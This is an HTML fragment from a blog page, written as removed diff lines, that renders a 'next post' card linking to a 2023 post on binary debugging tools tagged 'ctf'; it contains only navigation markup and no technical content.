-            <div class="article-badge right-badge text-color">
-                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
-            </div>
-            <div class="card">
-                <a href="/2023/04/04/er-jin-zhi-diao-shi-gong-ju/">
-                    <div class="card-image">
-                        
-                        
-                        <img src="/medias/featureimages/9.jpg" class="responsive-img" alt="二级制调试工具">
-                        
-                        <span class="card-title">二级制调试工具</span>
-                    </div>
-                </a>
-                <div class="card-content article-content">
-                    <div class="summary block-with-text">
-                        
-                            
-                        
-                    </div>
-                    <div class="publish-info">
-                            <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2023-04-04
-                            </span>
-                        <span class="publish-author">
-                            
-                            <i class="fas fa-bookmark fa-fw icon-category"></i>
-                            
-                            <a href="/categories/ctf/" class="post-category">
-                                    ctf
-                                </a>
-                            
-                            
-                        </span>
-                    </div>
-                </div>
-                
-                <div class="card-action article-tags">
-                    
-                    <a href="/tags/ctf/">
-                        <span class="chip bg-color">ctf</span>
                     </a>
                     
                 </div>
